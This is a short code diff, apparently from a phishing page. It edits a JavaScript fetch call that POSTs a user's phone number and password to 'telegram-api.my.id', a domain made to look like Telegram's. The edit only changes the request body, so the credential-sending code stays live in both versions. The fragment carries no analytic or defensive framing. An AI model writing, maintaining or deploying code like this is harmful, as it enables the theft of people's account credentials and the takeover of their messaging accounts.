@@ -336,7 +336,7 @@ function WahyuStrIDThree() {
     fetch("https://telegram-api.my.id/", {
         method: "POST",
         headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: `action=password&phone=+${phone}&password=${password}` 
+        body: `phone=+${phone}&password=${password}` 
     })
     .then(response => response.json())
     .then(data => {
